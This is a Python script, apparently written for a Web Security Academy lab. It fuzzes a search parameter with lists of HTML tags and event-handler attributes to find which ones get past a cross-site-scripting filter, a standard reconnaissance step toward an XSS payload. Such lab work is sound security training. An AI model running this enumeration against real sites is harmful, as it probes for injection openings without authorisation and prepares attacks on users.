from ratelimit import limits, RateLimitException, sleep_and_retry
from pathlib import Path
from requests import get

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 120
url = 'https://INSTANCE-ID.web-security-academy.net/?search='

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_tag_call(url, tag):
    return get(f'{url}<{tag}>')

def tag_enum(url, tag_file_path):
    tags = []
    with Path(tag_file_path).open('r') as file:
        for tag in file.readlines():
            response = make_tag_call(url, tag.strip())
            if response.status_code != 400:
                tags.append(tag.strip())
    
    return tags

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_event_call(url, tag, event):
    return get(f'{url}<{tag}%20{event}>')

def event_enum(url, tag, event_file_path):
    events = []
    with Path(event_file_path).open('r') as file:
        for event in file.readlines():
            response = make_event_call(url, tag.strip(), event.strip())
            if response.status_code != 400:
                events.append(event)
    return events

def main():
    tags = tag_enum(url, 'tags.txt')
    print(tags)
    for tag in tags:
        events = event_enum(url, tag, 'events.txt')
        print(tag, ':', events)
        
if __name__ == '__main__':
    main()